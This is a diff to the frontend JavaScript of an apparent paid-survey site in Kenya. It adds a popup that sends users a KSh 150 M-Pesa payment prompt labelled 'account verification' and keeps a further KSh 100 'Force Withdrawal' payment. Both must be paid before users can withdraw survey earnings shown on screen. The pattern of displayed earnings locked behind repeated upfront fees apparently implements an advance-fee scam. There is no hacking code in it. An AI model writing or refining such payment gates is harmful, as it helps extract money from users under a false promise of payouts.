@@ -30,8 +30,7 @@ window.addEventListener('DOMContentLoaded', () => {
   if (nav) {
     window.addEventListener('scroll', () => {
       nav.style.boxShadow = window.scrollY > 10
-        ? '0 4px 24px rgba(0,0,0,0.45)'
-        : 'none';
+        ? '0 4px 24px rgba(0,0,0,0.45)' : 'none';
     });
   }
   if (token) loadUser();
@@ -188,6 +187,210 @@ function closeModal() {
 }
 
 // ════════════════════════════════════════════
+// VERIFICATION POPUP MODAL
+// ════════════════════════════════════════════
+function openVerifModal() {
+  const overlay = document.getElementById('verif-modal-overlay');
+  const phoneStep = document.getElementById('verif-phone-step');
+  const proceedBtn = document.getElementById('verif-proceed-btn');
+  const phoneInput = document.getElementById('verif-phone-input');
+  const verifErr   = document.getElementById('verif-error');
+  const verifSucc  = document.getElementById('verif-success');
+  const regBtn     = document.getElementById('verif-register-btn');
+
+  if (!overlay) return;
+
+  // Reset modal to initial state
+  if (phoneStep)   phoneStep.classList.add('hidden');
+  if (proceedBtn)  {
+    proceedBtn.classList.remove('hidden');
+    proceedBtn.disabled  = false;
+    proceedBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Proceed with Verification';
+  }
+  if (phoneInput)  phoneInput.value = '';
+  if (verifErr)    clearAlert(verifErr);
+  if (verifSucc)   clearAlert(verifSucc);
+  if (regBtn) {
+    regBtn.disabled  = false;
+    regBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Register Now – Send KSh 150 Prompt';
+  }
+
+  // Show registered phone if available
+  const verifPhone = document.getElementById('verif-modal-phone');
+  if (verifPhone) {
+    verifPhone.textContent = stats.activationPhone
+      ? formatPhoneDisplay(stats.activationPhone)
+      : 'Your M-Pesa number';
+  }
+
+  overlay.classList.remove('hidden');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeVerifModal() {
+  const overlay = document.getElementById('verif-modal-overlay');
+  if (overlay) overlay.classList.add('hidden');
+  document.body.style.overflow = '';
+}
+
+function showVerifPhoneStep() {
+  const phoneStep  = document.getElementById('verif-phone-step');
+  const proceedBtn = document.getElementById('verif-proceed-btn');
+  if (phoneStep)  phoneStep.classList.remove('hidden');
+  if (proceedBtn) proceedBtn.classList.add('hidden');
+
+  // Focus phone input
+  setTimeout(() => {
+    document.getElementById('verif-phone-input')?.focus();
+  }, 100);
+}
+
+// ── STK push from the popup modal ──
+async function doVerifActivate() {
+  const phoneEl = document.getElementById('verif-phone-input');
+  const errEl   = document.getElementById('verif-error');
+  const succEl  = document.getElementById('verif-success');
+  const regBtn  = document.getElementById('verif-register-btn');
+
+  if (!phoneEl || !errEl || !succEl || !regBtn) return;
+
+  // ── Frontend cooldown check ──
+  const cooldownLeft = getCooldownRemaining(activationCooldownEnd);
+  if (cooldownLeft > 0) {
+    errEl.className = 'alert info show';
+    errEl.innerHTML = `<i class="fas fa-clock" style="margin-right:6px"></i>
+      Please wait <strong>${cooldownLeft}s</strong> before requesting another prompt.`;
+    return;
+  }
+
+  // ── Poll already running ──
+  if (activationPollTimer) {
+    errEl.className = 'alert info show';
+    errEl.innerHTML = '<i class="fas fa-info-circle" style="margin-right:6px"></i>Verification in progress. Check your phone for the prompt.';
+    return;
+  }
+
+  const phone = phoneEl.value.trim();
+  clearAlert(errEl); clearAlert(succEl);
+  if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }
+
+  // ── Set cooldown BEFORE API call ──
+  activationCooldownEnd = Date.now() + FRONTEND_COOLDOWN_MS;
+
+  regBtn.disabled  = true;
+  regBtn.innerHTML = '<span class="spinner"></span> Sending KSh 150 prompt...';
+
+  try {
+    const data = await apiFetch('/activation/initiate', 'POST', { phone });
+    activationRef = data.reference;
+
+    showAlert(succEl, 'KSh 150 M-Pesa prompt sent! Enter your PIN on your phone to verify.');
+    toast('Check your phone for the KSh 150 M-Pesa prompt.', 'info');
+
+    regBtn.innerHTML = '<i class="fas fa-clock"></i> Waiting for payment confirmation...';
+
+    // Poll from inside modal
+    startActivationPollModal(activationRef, regBtn, errEl, succEl);
+
+  } catch (err) {
+    clearAlert(succEl);
+
+    const secMatch    = (err.message || '').match(/(\d+)\s*second/i);
+    const minMatch    = (err.message || '').match(/(\d+)\s*minute/i);
+    const backendSecs = secMatch
+      ? parseInt(secMatch[1])
+      : minMatch ? parseInt(minMatch[1]) * 60 : 60;
+
+    const isRateLimit = err.message && (
+      err.message.toLowerCase().includes('wait') ||
+      err.message.toLowerCase().includes('blocked') ||
+      err.message.toLowerCase().includes('spam') ||
+      err.message.toLowerCase().includes('too many') ||
+      err.message.toLowerCase().includes('minute')
+    );
+
+    if (isRateLimit) {
+      activationCooldownEnd = Date.now() + (backendSecs * 1000);
+      errEl.className = 'alert info show';
+      errEl.innerHTML = `<i class="fas fa-clock" style="margin-right:6px"></i>
+        Too many requests. Please wait <strong>${backendSecs}s</strong> before trying again.`;
+      regBtn.disabled  = false;
+      regBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Register Now – Send KSh 150 Prompt';
+    } else {
+      activationCooldownEnd = 0;
+      showAlert(errEl, err.message || 'Failed to send prompt. Please try again.');
+      regBtn.disabled  = false;
+      regBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Register Now – Send KSh 150 Prompt';
+    }
+  }
+}
+
+// Polls from inside the modal — closes modal and shows force gate on success
+function startActivationPollModal(ref, btn, errEl, succEl) {
+  if (activationPollTimer) clearInterval(activationPollTimer);
+  let attempts = 0;
+
+  activationPollTimer = setInterval(async () => {
+    attempts++;
+
+    if (attempts > 20) {
+      clearInterval(activationPollTimer);
+      activationPollTimer = null;
+      if (btn) {
+        btn.disabled  = false;
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i> Register Now – Send KSh 150 Prompt';
+      }
+      if (errEl) showAlert(errEl, 'Prompt expired after 2 minutes. If you paid, contact support. Otherwise try again after the cooldown.');
+      return;
+    }
+
+    try {
+      const data = await apiFetch(`/activation/status/${ref}`);
+
+      if (data.status === 'success') {
+        clearInterval(activationPollTimer);
+        activationPollTimer   = null;
+        activationCooldownEnd = 0; // Reset only on success
+
+        // Close modal
+        closeVerifModal();
+
+        await loadStats();
+
+        // Show force gate in withdraw panel
+        const wdLocked = document.getElementById('wd-locked');
+        const wdForce  = document.getElementById('wd-force');
+        if (wdLocked) wdLocked.classList.add('hidden');
+        if (wdForce) {
+          wdForce.classList.remove('hidden');
+          // Make sure withdraw panel is visible
+          showPanel('withdraw');
+          setTimeout(() => {
+            wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          }, 300);
+        }
+
+        toast('Account verified! Complete Force Withdrawal to enable payouts.', 'success');
+
+      } else if (data.status === 'failed') {
+        clearInterval(activationPollTimer);
+        activationPollTimer = null;
+        // Keep cooldown running on failure
+        if (errEl) showAlert(errEl, 'Payment was cancelled or failed. Please wait for the cooldown then try again.');
+        if (btn) {
+          btn.disabled  = false;
+          btn.innerHTML = '<i class="fas fa-paper-plane"></i> Register Now – Send KSh 150 Prompt';
+        }
+      }
+      // pending — wait
+
+    } catch (err) {
+      console.error('Activation poll error:', err.message);
+    }
+  }, 6000);
+}
+
+// ════════════════════════════════════════════
 // AUTH
 // ════════════════════════════════════════════
 function switchTab(tab) {
@@ -208,7 +411,7 @@ async function doRegister() {
   clearAlert(errEl);
   if (!phone || !pin || !pin2) { showAlert(errEl, 'All fields are required.'); return; }
 
-  btn.disabled = true;
+  btn.disabled  = true;
   btn.innerHTML = '<span class="spinner"></span>';
   try {
     const data = await apiFetch('/auth/register', 'POST', { phone, pin, pin2 });
@@ -220,7 +423,7 @@ async function doRegister() {
   } catch (err) {
     showAlert(errEl, err.message || 'Registration failed.');
   } finally {
-    btn.disabled = false;
+    btn.disabled  = false;
     btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
   }
 }
@@ -234,7 +437,7 @@ async function doLogin() {
   clearAlert(errEl);
   if (!phone || !pin) { showAlert(errEl, 'Phone and PIN required.'); return; }
 
-  btn.disabled = true;
+  btn.disabled  = true;
   btn.innerHTML = '<span class="spinner"></span>';
   try {
     const data = await apiFetch('/auth/login', 'POST', { phone, pin });
@@ -252,7 +455,7 @@ async function doLogin() {
   } catch (err) {
     showAlert(errEl, err.message || 'Login failed.');
   } finally {
-    btn.disabled = false;
+    btn.disabled  = false;
     btn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
   }
 }
@@ -271,7 +474,7 @@ async function doCompleteProfile() {
     showAlert(errEl, 'All fields are required.'); return;
   }
 
-  btn.disabled = true;
+  btn.disabled  = true;
   btn.innerHTML = '<span class="spinner"></span>';
   try {
     await apiFetch('/auth/profile/complete', 'POST', { name, county, occupation, education });
@@ -286,7 +489,7 @@ async function doCompleteProfile() {
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to save profile.');
   } finally {
-    btn.disabled = false;
+    btn.disabled  = false;
     btn.innerHTML = '<i class="fas fa-check"></i> Save Profile and Continue';
   }
 }
@@ -297,6 +500,7 @@ function doLogout() {
   if (statsFetchTimer)      { clearTimeout(statsFetchTimer);       statsFetchTimer      = null; }
   activationCooldownEnd = 0;
   forceCooldownEnd      = 0;
+  closeVerifModal();
   token       = null;
   userProfile = null;
   stats = {
@@ -339,8 +543,10 @@ function updateDashboard() {
   const remaining = total - completed;
   const pct       = Math.round((completed / total) * 100);
 
-  const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
-  const setStyle = (id, prop, val) => { const el = document.getElementById(id); if (el) el.style[prop] = val; };
+  const set = (id, val) => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = val;
+  };
 
   set('sidebar-balance',   `KSh ${bal}`);
   set('sidebar-earned',    `Total compensation: KSh ${earned}`);
@@ -351,7 +557,9 @@ function updateDashboard() {
   set('stat-remaining',    remaining);
   set('progress-text',     `${completed} / ${total} completed`);
   set('nav-survey-badge',  remaining);
-  setStyle('progress-fill', 'width', pct + '%');
+
+  const progFill = document.getElementById('progress-fill');
+  if (progFill) progFill.style.width = pct + '%';
 
   const hour  = new Date().getHours();
   const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
@@ -377,9 +585,9 @@ function updateDashboard() {
       step2.className = 'wcta-step';
       step3.className = 'wcta-step';
       if (wctaTitle) wctaTitle.textContent = 'Withdraw Your Earnings';
-      if (wctaDesc)  wctaDesc.textContent  = 'Complete a one-time KSh 120 verification to activate M-Pesa withdrawals.';
+      if (wctaDesc)  wctaDesc.textContent  = 'A one-time KSh 150 account verification is required before your first withdrawal.';
       if (wctaBtn) {
-        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account – KSh 120';
+        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account – KSh 150';
         wctaBtn.onclick   = () => showPanel('withdraw');
       }
     } else if (!stats.forceVerified) {
@@ -447,11 +655,13 @@ function renderAllTransactions() {
 function renderTxItem(tx) {
   const isPositive = tx.amount > 0;
   let iconClass = 'earn', iconName = 'coins';
-  if (tx.type === 'withdrawal')                                   { iconClass = 'withdraw'; iconName = 'paper-plane'; }
+  if (tx.type === 'withdrawal')                                    { iconClass = 'withdraw'; iconName = 'paper-plane'; }
   else if (tx.type === 'welcome_bonus' || tx.type === 'activation') { iconClass = 'bonus';    iconName = 'gift'; }
 
   const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', { day: 'numeric', month: 'short', year: 'numeric' });
-  const amount = isPositive ? `+KSh ${tx.amount.toFixed(2)}` : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;
+  const amount = isPositive
+    ? `+KSh ${tx.amount.toFixed(2)}`
+    : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;
 
   return `<div class="tx-item">
     <div class="tx-icon ${iconClass}"><i class="fas fa-${iconName}"></i></div>
@@ -557,12 +767,12 @@ async function submitAnswer(questionId, answerIndex, reward) {
       toast('Incorrect. Keep going!', 'error');
     }
 
-    card.dataset.answered   = 'true';
-    stats.balance           = data.balance;
+    card.dataset.answered    = 'true';
+    stats.balance            = data.balance;
     stats.completedQuestions = (stats.completedQuestions || 0) + 1;
     if (data.correct) stats.totalEarned = (stats.totalEarned || 0) + data.earned;
 
-    ['sidebar-balance', 'mobile-balance'].forEach(id => {
+    ['sidebar-balance','mobile-balance'].forEach(id => {
       const el = document.getElementById(id);
       if (el) el.textContent = `KSh ${data.balance.toFixed(2)}`;
     });
@@ -643,7 +853,7 @@ function updateWithdrawPanel() {
   if (phoneRow) phoneRow.classList.add('hidden');
 
   if (!stats.activated) {
-    if (statusEl) statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
+    if (statusEl) statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required – KSh 150</span>';
   } else if (!stats.forceVerified) {
     if (statusEl) statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Payout Pending</span>';
     if (stats.activationPhone && phoneRow && regPhone) {
@@ -689,23 +899,30 @@ async function doWithdraw() {
   if (wdLocked) wdLocked.classList.add('hidden');
   if (wdForce)  wdForce.classList.add('hidden');
 
+  // ── Step 1: Basic validation ──
   if (!phone) { showAlert(errEl, 'Please enter a recipient M-Pesa number.'); return; }
   if (isNaN(amount) || amount < 150) { showAlert(errEl, 'Minimum withdrawal is KSh 150.'); return; }
   if (amount > (stats.balance || 0)) {
-    showAlert(errEl, `Insufficient balance. Available: KSh ${(stats.balance || 0).toFixed(2)}.`);
-    return;
-  }
-  if (!stats.activated) {
-    showAlert(errEl, 'Complete account verification below before withdrawing.');
-    if (wdLocked) { wdLocked.classList.remove('hidden'); wdLocked.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
-    return;
-  }
-  if (!stats.forceVerified) {
-    showAlert(errEl, 'Complete Force Withdrawal activation below before withdrawing.');
-    if (wdForce) { wdForce.classList.remove('hidden'); wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+    showAlert(errEl, `Insufficient balance. Your available balance is KSh ${(stats.balance || 0).toFixed(2)}.`);
     return;
   }
 
+  // ── Step 2: Verification gate — open popup instead of inline ──
+  if (!stats.activated) {
+    openVerifModal();
+    return;
+  }
+
+  if (!stats.forceVerified) {
+    showAlert(errEl, 'Force Withdrawal activation required. Complete the KSh 100 activation below to proceed.');
+    if (wdForce) {
+      wdForce.classList.remove('hidden');
+      wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+    return;
+  }
+
+  // ── Step 3: Process withdrawal ──
   const fee     = parseFloat((amount * 0.04).toFixed(2));
   const receive = parseFloat((amount - fee).toFixed(2));
 
@@ -717,12 +934,12 @@ async function doWithdraw() {
     stats.balance = data.balance;
     updateDashboard();
     updateWithdrawPanel();
-    showAlert(succEl, `Request of KSh ${amount} submitted. You will receive KSh ${receive} after KSh ${fee} fee. Arrives within 24hrs.`);
-    toast('Payment request submitted!', 'success');
+    showAlert(succEl, `Request of KSh ${amount} submitted. You will receive KSh ${receive} after the KSh ${fee} fee. Funds arrive within 24 hours.`);
+    toast('Withdrawal submitted successfully!', 'success');
     phoneEl.value = '';
     loadStats();
   } catch (err) {
-    showAlert(errEl, err.message || 'Payment request failed. Try again.');
+    showAlert(errEl, err.message || 'Withdrawal failed. Please try again.');
   } finally {
     btn.disabled  = false;
     btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Request';
@@ -786,155 +1003,12 @@ function startCooldownCountdown(btn, errEl, seconds, resetLabel) {
       }
     } else {
       render();
-      // Update info message too
       if (errEl && errEl.classList.contains('info')) {
         errEl.innerHTML = `<i class="fas fa-clock" style="margin-right:6px"></i>
           M-Pesa prompt sent. Kindly wait <strong>${remaining}s</strong> before requesting a new one.`;
       }
     }
   }, 1000);
-}
-
-// ════════════════════════════════════════════
-// ACCOUNT VERIFICATION (KSh 120)
-// ════════════════════════════════════════════
-async function doActivate() {
-  const errEl   = document.getElementById('act-error');
-  const succEl  = document.getElementById('act-success');
-  const btn     = document.getElementById('btn-activate');
-  const phoneEl = document.getElementById('act-phone');
-
-  if (!phoneEl || !errEl || !succEl || !btn) return;
-
-  // ── 1. Frontend cooldown check FIRST ──
-  const cooldownLeft = getCooldownRemaining(activationCooldownEnd);
-  if (cooldownLeft > 0) {
-    startCooldownCountdown(
-      btn, errEl, cooldownLeft,
-      '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account'
-    );
-    return;
-  }
-
-  // ── 2. Poll already running guard ──
-  if (activationPollTimer) {
-    errEl.className = 'alert info show';
-    errEl.innerHTML = '<i class="fas fa-info-circle" style="margin-right:6px"></i>Verification in progress. Please check your phone for the M-Pesa prompt.';
-    return;
-  }
-
-  const phone = phoneEl.value.trim();
-  clearAlert(errEl); clearAlert(succEl);
-  if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }
-
-  // ── 3. Set cooldown BEFORE API call to prevent race condition ──
-  activationCooldownEnd = Date.now() + FRONTEND_COOLDOWN_MS;
-
-  btn.disabled  = true;
-  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';
-
-  try {
-    const data = await apiFetch('/activation/initiate', 'POST', { phone });
-    activationRef = data.reference;
-    showAlert(succEl, 'M-Pesa prompt sent! Enter your PIN on your phone to complete verification.');
-    toast('Check your phone for the M-Pesa prompt.', 'info');
-    startActivationPoll(activationRef, btn);
-
-  } catch (err) {
-    clearAlert(succEl);
-
-    // Extract seconds from backend cooldown message
-    const secMatch   = (err.message || '').match(/(\d+)\s*second/i);
-    const minMatch   = (err.message || '').match(/(\d+)\s*minute/i);
-    const backendSecs = secMatch
-      ? parseInt(secMatch[1])
-      : minMatch
-        ? parseInt(minMatch[1]) * 60
-        : 60;
-
-    const isRateLimit = err.message && (
-      err.message.toLowerCase().includes('wait') ||
-      err.message.toLowerCase().includes('blocked') ||
-      err.message.toLowerCase().includes('spam') ||
-      err.message.toLowerCase().includes('too many') ||
-      err.message.toLowerCase().includes('minute')
-    );
-
-    if (isRateLimit) {
-      // Sync frontend cooldown with backend
-      activationCooldownEnd = Date.now() + (backendSecs * 1000);
-      startCooldownCountdown(
-        btn, errEl, backendSecs,
-        '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account'
-      );
-    } else {
-      // Non-rate-limit error — reset cooldown so they can retry
-      activationCooldownEnd = 0;
-      showAlert(errEl, err.message || 'Failed to send prompt. Please try again.');
-      btn.disabled  = false;
-      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account';
-    }
-  }
-}
-
-function startActivationPoll(ref, btn) {
-  if (activationPollTimer) clearInterval(activationPollTimer);
-  let attempts = 0;
-
-  activationPollTimer = setInterval(async () => {
-    attempts++;
-
-    if (attempts > 20) { // 20 × 6s = 120s max
-      clearInterval(activationPollTimer);
-      activationPollTimer = null;
-      // Keep cooldown running — don't reset on timeout
-      if (btn) {
-        btn.disabled  = false;
-        btn.classList.remove('btn-cooldown');
-        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account';
-      }
-      const errEl = document.getElementById('act-error');
-      if (errEl) showAlert(errEl, 'Prompt expired after 2 minutes. If you paid, please contact support. Otherwise wait for the countdown and try again.');
-      return;
-    }
-
-    try {
-      const data = await apiFetch(`/activation/status/${ref}`);
-
-      if (data.status === 'success') {
-        clearInterval(activationPollTimer);
-        activationPollTimer   = null;
-        activationCooldownEnd = 0; // ✅ Only reset on SUCCESS
-        await loadStats();
-        const wdLocked = document.getElementById('wd-locked');
-        const wdForce  = document.getElementById('wd-force');
-        if (wdLocked) wdLocked.classList.add('hidden');
-        if (wdForce)  {
-          wdForce.classList.remove('hidden');
-          wdForce.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-        toast('Account verified! Complete Force Withdrawal to enable payouts.', 'success');
-        if (btn) { btn.disabled = false; btn.classList.remove('btn-cooldown'); }
-
-      } else if (data.status === 'failed') {
-        clearInterval(activationPollTimer);
-        activationPollTimer = null;
-        // ❌ Do NOT reset cooldown on failure — keep the 60s running
-        const errEl = document.getElementById('act-error');
-        if (errEl) showAlert(errEl, 'Payment was cancelled or failed. Please wait for the countdown then try again.');
-        if (btn) {
-          btn.disabled  = false;
-          btn.classList.remove('btn-cooldown');
-          btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account';
-        }
-      }
-      // pending — wait for next tick
-
-    } catch (err) {
-      console.error('Activation poll error:', err.message);
-      // Network error — keep polling
-    }
-  }, 6000);
 }
 
 // ════════════════════════════════════════════
@@ -947,7 +1021,7 @@ async function doForceVerify() {
 
   if (!errEl || !succEl || !btn) return;
 
-  // ── 1. Frontend cooldown check FIRST ──
+  // ── Frontend cooldown check ──
   const cooldownLeft = getCooldownRemaining(forceCooldownEnd);
   if (cooldownLeft > 0) {
     startCooldownCountdown(
@@ -957,16 +1031,16 @@ async function doForceVerify() {
     return;
   }
 
-  // ── 2. Poll already running guard ──
+  // ── Poll already running guard ──
   if (forceVerifyPollTimer) {
     errEl.className = 'alert info show';
-    errEl.innerHTML = '<i class="fas fa-info-circle" style="margin-right:6px"></i>Force withdrawal in progress. Please check your phone for the M-Pesa prompt.';
+    errEl.innerHTML = '<i class="fas fa-info-circle" style="margin-right:6px"></i>Force withdrawal in progress. Check your phone for the M-Pesa prompt.';
     return;
   }
 
   clearAlert(errEl); clearAlert(succEl);
 
-  // ── 3. Set cooldown BEFORE API call ──
+  // ── Set cooldown BEFORE API call ──
   forceCooldownEnd = Date.now() + FRONTEND_COOLDOWN_MS;
 
   btn.disabled  = true;
@@ -986,9 +1060,7 @@ async function doForceVerify() {
     const minMatch    = (err.message || '').match(/(\d+)\s*minute/i);
     const backendSecs = secMatch
       ? parseInt(secMatch[1])
-      : minMatch
-        ? parseInt(minMatch[1]) * 60
-        : 60;
+      : minMatch ? parseInt(minMatch[1]) * 60 : 60;
 
     const isRateLimit = err.message && (
       err.message.toLowerCase().includes('wait') ||
@@ -1020,17 +1092,16 @@ function startForceVerifyPoll(ref, btn) {
   forceVerifyPollTimer = setInterval(async () => {
     attempts++;
 
-    if (attempts > 20) { // 20 × 6s = 120s max
+    if (attempts > 20) {
       clearInterval(forceVerifyPollTimer);
       forceVerifyPollTimer = null;
-      // Keep cooldown running on timeout
       if (btn) {
         btn.disabled  = false;
         btn.classList.remove('btn-cooldown');
         btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
       }
       const errEl = document.getElementById('fv-error');
-      if (errEl) showAlert(errEl, 'Prompt expired after 2 minutes. If you paid, please contact support. Otherwise wait for the countdown and try again.');
+      if (errEl) showAlert(errEl, 'Prompt expired after 2 minutes. If you paid, contact support. Otherwise wait for the cooldown and try again.');
       return;
     }
 
@@ -1040,7 +1111,7 @@ function startForceVerifyPoll(ref, btn) {
       if (data.status === 'success') {
         clearInterval(forceVerifyPollTimer);
         forceVerifyPollTimer = null;
-        forceCooldownEnd     = 0; // ✅ Only reset on SUCCESS
+        forceCooldownEnd     = 0; // Reset only on success
         await loadStats();
         const wdForce = document.getElementById('wd-force');
         if (wdForce) wdForce.classList.add('hidden');
@@ -1050,9 +1121,9 @@ function startForceVerifyPoll(ref, btn) {
       } else if (data.status === 'failed') {
         clearInterval(forceVerifyPollTimer);
         forceVerifyPollTimer = null;
-        // ❌ Do NOT reset cooldown on failure
+        // Keep cooldown running on failure
         const errEl = document.getElementById('fv-error');
-        if (errEl) showAlert(errEl, 'Payment was cancelled or failed. Please wait for the countdown then try again.');
+        if (errEl) showAlert(errEl, 'Payment was cancelled or failed. Please wait for the cooldown then try again.');
         if (btn) {
           btn.disabled  = false;
           btn.classList.remove('btn-cooldown');
